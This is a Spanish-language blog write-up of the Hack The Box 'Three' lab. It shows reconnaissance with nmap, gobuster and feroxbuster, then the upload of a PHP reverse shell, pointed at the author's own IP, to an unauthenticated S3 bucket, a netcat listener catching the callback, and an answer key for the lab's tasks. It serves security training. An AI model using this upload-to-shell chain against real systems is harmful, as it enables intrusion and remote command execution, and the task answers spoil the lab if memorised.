---
title: HTB - Starting Point - Tier 1 - Three Writeup
date: 2022-08-10 09:40:00 +0800
categories: [HTB, Writeup]
tags: [htb, writeups]     # TAG names should always be lowercase
---

Este post forma parte de la serie **Tier 1** del **Starting Point** de [HTB](https://app.hackthebox.com/starting-point) que iniciamos [aquí]({% post_url 2022-08-10-htb-writeup-tier1-appointment %}).

## Three

El primer paso será iniciar la máquina (para lo que previamente tendremos que tener establecida nuestra conexión VPN)

Copiamos la IP del equipo remoto, en mi caso *10.129.71.219*, y lanzamos un **nmap**.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ nmap -A 10.129.71.219 -oN nmap_output
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-10 20:39 CEST
Nmap scan report for 10.129.71.219
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Toppers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.04 seconds
```

Significado de las flags:

* `-A`&nbsp;: escaneo completo (aka agresivo) que ejecuta OS detection, version detection, script scanning y traceroute todo del tirón.
* `-oN`&nbsp;: imprime la salida en un fichero de texto con el nombre *nmap_output*

Echamos un ojo a la salida y vemos que tenemos dos puertos abiertos:

* *22/tcp* con un servicio ssh escuchando.
* *80/tcp* con un servicio http soportado por un Apache httpd 2.4.29.

Abrimos un navegador y cargamos la IP.

![](/assets/posts/20220810/img15.png)

Trasteamos un poco con el sitio web y apuntamos la dirección de Email que aparece en la sección de Contacto: *mail@thetoppers.htb*

Añadimos la siguiente entrada al fichero <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">etc/hosts</code>&nbsp;&nbsp;de nuestro equipo para facilitarnos la faena.

```
10.129.71.219	thetoppers.htb
```

La siguiente tarea del box nos pregunta por *subdominios*. Toca buscarlos. Para ello localizamos un diccionario apropiado en nuestro equipo.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ locate subdomains
/usr/lib/python3/dist-packages/censys/asm/assets/subdomains.py
/usr/lib/python3/dist-packages/censys/asm/assets/__pycache__/subdomains.cpython-310.pyc
/usr/share/dnsrecon/subdomains-top1mil-20000.txt
/usr/share/dnsrecon/subdomains-top1mil-5000.txt
/usr/share/dnsrecon/subdomains-top1mil.txt
/usr/share/metasploit-framework/data/wordlists/lync_subdomains.txt
/usr/share/metasploit-framework/modules/auxiliary/gather/searchengine_subdomains_collector.rb
/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
/usr/share/seclists/Discovery/DNS/combined_subdomains.txt
/usr/share/seclists/Discovery/DNS/italian-subdomains.txt
/usr/share/seclists/Discovery/DNS/shubs-subdomains.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

Para escanear subdominios utilizamos el modo *vhost* de **gobuster** con */usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt* como diccionario.

> **VHOST mode:** Este modo no debe confundirse con el modo DNS. En el modo DNS la herramienta intenta resolver por DNS los subdominios y en base a eso se nos da el resultado. En el modo vhosts la herramienta comprueba si el subdominio existe visitando la url formada y verificando la dirección IP. [(fuente)](https://erev0s.com/blog/gobuster-directory-dns-and-virtual-hosts-bruteforcing/#vhost-mode)


```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://thetoppers.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/08/10 21:45:40 Starting gobuster in VHOST enumeration mode
===============================================================
Found: s3.thetoppers.htb (Status: 404) [Size: 21]
Found: gc._msdcs.thetoppers.htb (Status: 400) [Size: 306]

===============================================================
2022/08/10 21:46:13 Finished
===============================================================
```

Añadimos el subdominio *s3.thetoppers.htb* al <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">etc/hosts</code>&nbsp;.

```
10.129.71.219	thetoppers.htb s3.thetoppers.htb
```

Probamos a cargarlo en el navegador. Poca cosa.

El nombre del subdominio apunta a uno de los servicios más conocidos de **AWS [S3](https://aws.amazon.com/s3/)**. Lo que tenemos aquí es, concretamente, un **bucket de S3**.

Toca enumerar directorios del bucket a ver qué encontramos. Buscamos diccionario para ello.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ locate directory-list
/usr/share/dirbuster/wordlists/directory-list-1.0.txt
/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
/usr/share/whatweb/plugins/simple-directory-listing.rb
```

Utilizamos **feroxbuster** con */usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt* como diccionario.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ feroxbuster -u http://s3.thetoppers.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e -t 100 -o feroxbuster_output

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://s3.thetoppers.htb/
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ feroxbuster_output
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l       72w      887c http://s3.thetoppers.htb/health
200      GET        0l        0w        0c http://s3.thetoppers.htb/shell
405      GET        4l       23w      178c http://s3.thetoppers.htb/graph
500      GET        1l        1w        2c http://s3.thetoppers.htb/shellcode
500      GET        1l        1w        2c http://s3.thetoppers.htb/shells
500      GET        1l        1w        2c http://s3.thetoppers.htb/shellscripts
500      GET        1l        1w        2c http://s3.thetoppers.htb/shellen
500      GET        1l        1w        2c http://s3.thetoppers.htb/shellcity
500      GET        1l        1w        2c http://s3.thetoppers.htb/shell_screenshot
500      GET        1l        1w        2c http://s3.thetoppers.htb/shell01
500      GET        1l        1w        2c http://s3.thetoppers.htb/shell02
500      GET        1l        1w        2c http://s3.thetoppers.htb/shelley
500      GET        1l        1w        2c http://s3.thetoppers.htb/shell-scripts
[####################] - 28m    87650/87650   0s      found:13      errors:0
[####################] - 28m    87650/87650   51/s    http://s3.thetoppers.htb/
```

Significado de las flags:

* `-u`&nbsp;: la URL que queremos escanear.
* `-w`&nbsp;: la ubicación de nuestro fichero de wordlist.
* `-e`&nbsp;: le pedimos que extraiga enlaces del cuerpo de la respuesta y realice nuevas peticiones en función de los resultados.
* `-t`&nbsp;: nro de hilos concurrentes.
* `-o`&nbsp;: nombre del fichero donde almacenaremos la salida.

Probamos la URL *http://s3.thetoppers.htb/health* desde el navegador.

![](/assets/posts/20220810/img16.png)

OK, nada interesante. Vamos a interactuar con este bucket s3 desde nuestra consola. Para ello abrimos el cliente de **aws**. Si no lo tenéis instalado: `sudo apt install awscli`

Ejecutamos **aws** para intentar listar los recursos que pueda haber en *http://s3.thetoppers.htb*

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ aws s3 ls s3://thetoppers.htb
Unable to locate credentials. You can configure credentials by running "aws configure".
```

El cliente de aws nos dice que no se puede conectar porque no tenemos las credenciales necesarias configuradas en nuestro equipo. Nos sugiere que ejecutemos *aws configure*.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ aws configure
AWS Access Key ID [None]:
```

Pequeño inconveniente: no disponemos del *AWS Access Key ID* :(
    
Lo dejamos vacío y hacemos lo mismo con el resto de parámetros de configuracion que nos solicita el cli dando al Enter directamente. Volvemos a probar listar el bucket.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ aws configure
AWS Access Key ID [None]:
AWS Secret Access Key [None]:
Default region name [None]:
Default output format [None]:
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ aws s3 ls s3://thetoppers.htb
Unable to locate credentials. You can configure credentials by running "aws configure".
```

OK, por lo visto no hay forma de listar el bucket sin disponer de las credenciales correspondientes.

Trasteamos desde el navegador por lo directorios que nos ha volcado **feroxbuster** a ver si encontramos algo.

Nada.

Volvemos a leer con más optimismo el mensaje que nos ha devuelto el cli de aws tras haber dejado vacíos los parámetros de configuración. En principio no nos dice nada sobre que sean erróneos, simplemente refiere *Unable to locate credentials*. Probamos a meter cualquier cosa a ver que pasa.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ aws configure
AWS Access Key ID [None]: qwe
AWS Secret Access Key [None]: qwe
Default region name [None]: qwe
Default output format [None]: qwe
```

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ aws s3 ls s3://thetoppers.htb

Could not connect to the endpoint URL: "https://s3.a.amazonaws.com/thetoppers.htb?list-type=2&prefix=&delimiter=%2F&encoding-type=url"
```

OK, no hemos conseguido listar nada, pero al menos ha cambiado el mensaje de error. Probamos a pasarle al cli la URL de nuestro endpoint.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ aws s3 --endpoint=http://s3.thetoppers.htb ls s3://thetoppers.htb
                           PRE images/
2022-08-10 21:09:54          0 .htaccess
2022-08-10 21:09:54      11952 index.php
```

Mejor. Una vez que hemos conseguido listarlo toca ver qué otras cosas podemos hacer con el bucket. Miramos [aquí](https://pentestbook.six2dez.com/enumeration/cloud/aws) y damos con esto.

![](/assets/posts/20220810/img17.png)

Especial atención a:

```
aws s3 cp/mv test-file.txt s3://bucket-name
```

Según ésto, podríamos copiar (aka subir) un fichero desde nuestro equipo al bucket. Interesante. Probamos con algo inofensivo para empezar.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ touch a.txt

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ echo "Hola que tal" > a.txt

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ cat a.txt
Hola que tal

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ aws s3 --endpoint=http://s3.thetoppers.htb cp a.txt s3://thetoppers.htb
upload: ./a.txt to s3://thetoppers.htb/a.txt
```

Probamos desde el browser a cargar la URL `http://thetoppers.htb/a.txt`

Funciona. Vamos a por algo más interesante que un txt, una shell reversa por ejemplo.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ locate php-reverse-shell
/usr/share/seclists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php
/usr/share/webshells/php/php-reverse-shell.php

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php .
```

La editamos con los datos correctos.

```
[...]
$ip = '10.10.xx.xx';  // CHANGE THIS    <- nuestra IP local
$port = 4321;       // CHANGE THIS      <- el puerto en el que estaremos escuchando
[...]
```

La subimos al bucket

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ aws s3 --endpoint=http://s3.thetoppers.htb cp php-reverse-shell.php s3://thetoppers.htb
upload: ./php-reverse-shell.php to s3://thetoppers.htb/php-reverse-shell.php
```

Abrimos una pestaña nueva en nuestro terminal e iniciamos **netcat** poniéndolo a escuchar en el puerto que hemos configurado en el fichero de la shell.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ nc -lvnp 4321
listening on [any] 4321 ...
```

Significado de las flags:

* `-l`&nbsp;: listen mode.
* `-v`&nbsp;: verbose.
* `-n`&nbsp;: solo IP numéricas, no DNS.
* `-p`&nbsp;: nro de puerto local.

Cargamos en el browser `http://thetoppers.htb/php-reverse-shell.php`&nbsp;&nbsp;y volvemos al **netcat**

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ nc -lvnp 4321
listening on [any] 4321 ...
connect to [10.10.xx.xx] from (UNKNOWN) [10.129.71.219] 42754
Linux three 4.15.0-189-generic #200-Ubuntu SMP Wed Jun 22 19:53:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 21:46:40 up  3:08,  0 users,  load average: 1.01, 1.76, 1.78
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

Bien. Toca trastear.

```console
[...]
/bin/sh: 0: can't access tty; job control turned off
$ pwd
/
$ ls -la
total 92
drwxr-xr-x  22 root root  4096 Jul 19 12:19 .
drwxr-xr-x  22 root root  4096 Jul 19 12:19 ..
drwxr-xr-x   2 root root  4096 Jul 19 12:19 bin
drwxr-xr-x   4 root root  4096 Jul 19 12:08 boot
drwxr-xr-x  19 root root  3880 Aug 10 18:37 dev
drwxr-xr-x 107 root root  4096 Aug  1 14:48 etc
drwxr-xr-x   3 root root  4096 Jul 19 12:19 home
lrwxrwxrwx   1 root root    34 Jul 19 12:05 initrd.img -> boot/initrd.img-4.15.0-189-generic
lrwxrwxrwx   1 root root    34 Jul 19 12:08 initrd.img.old -> boot/initrd.img-4.15.0-189-generic
drwxr-xr-x  22 root root  4096 Jul 19 11:59 lib
drwxr-xr-x   2 root root  4096 Jul 19 12:19 lib64
drwx------   2 root root 16384 Apr 12 18:39 lost+found
drwxr-xr-x   2 root root  4096 Jul 19 12:19 media
drwxr-xr-x   2 root root  4096 Jul 19 12:19 mnt
drwxrwxrwx   4 root root  4096 Apr 12 20:19 opt
dr-xr-xr-x 131 root root     0 Aug 10 18:37 proc
drwx------   8 root root  4096 Aug  1 14:49 root
drwxr-xr-x  30 root root   980 Aug 10 18:38 run
drwxr-xr-x   2 root root 12288 Jul 19 12:00 sbin
drwxr-xr-x   2 root root  4096 Aug  6  2020 srv
dr-xr-xr-x  13 root root     0 Aug 10 18:37 sys
drwxrwxrwt   2 root root  4096 Aug 10 18:37 tmp
drwxr-xr-x  10 root root  4096 Aug  6  2020 usr
drwxr-xr-x  13 root root  4096 Jul 19 11:57 var
lrwxrwxrwx   1 root root    31 Jul 19 12:05 vmlinuz -> boot/vmlinuz-4.15.0-189-generic
lrwxrwxrwx   1 root root    31 Jul 19 12:08 vmlinuz.old -> boot/vmlinuz-4.15.0-189-generic
$ cd var
$ ls
backups
cache
crash
lib
local
lock
log
mail
opt
run
spool
tmp
www
$ cd www
$ ls
flag.txt
html
$ cat flag.txt
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
$
```

Box resuelto.

Espero que os haya resultado útil.

Sed buenos de no haber opción mejor.

## Respuestas:

* <strong>Task 1</strong>: 2
* <strong>Task 2</strong>: thetoppers.htb
* <strong>Task 3</strong>: /etc/hosts
* <strong>Task 4</strong>: s3.thetoppers.htb
* <strong>Task 5</strong>: Amazon S3
* <strong>Task 6</strong>: awscli
* <strong>Task 7</strong>: aws configure
* <strong>Task 8</strong>: aws s3 ls
* <strong>Task 9</strong>: php